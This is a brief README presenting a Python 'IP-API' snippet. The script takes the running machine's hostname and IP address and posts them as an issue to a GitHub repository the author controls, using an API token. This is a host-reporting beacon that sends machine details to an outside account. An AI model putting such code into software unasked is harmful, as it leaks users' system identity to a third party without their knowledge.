# IP-API by [@D4RKH0R1Z0N](https://github.com/D4RKH0R1Z0N)

```
# Made by D4RKH0R1Z0N (C)
# GitHub-API-Client Account is owned by D4RKH0R1Z0N

import socket
import requests
import json

token = "*****************"
h_name = socket.gethostname()
IP_address = socket.gethostbyname(h_name)
headers = {"Authorization" : "token {}".format(token)}
data = {"title": h_name + " - " + IP_address}

username = "GitHub-API-Client"
Repositoryname = "ID-API"
url = "https://api.github.com/repos/{}/{}/issues".format(username,Repositoryname)

requests.post(url,data=json.dumps(data),headers=headers)
```
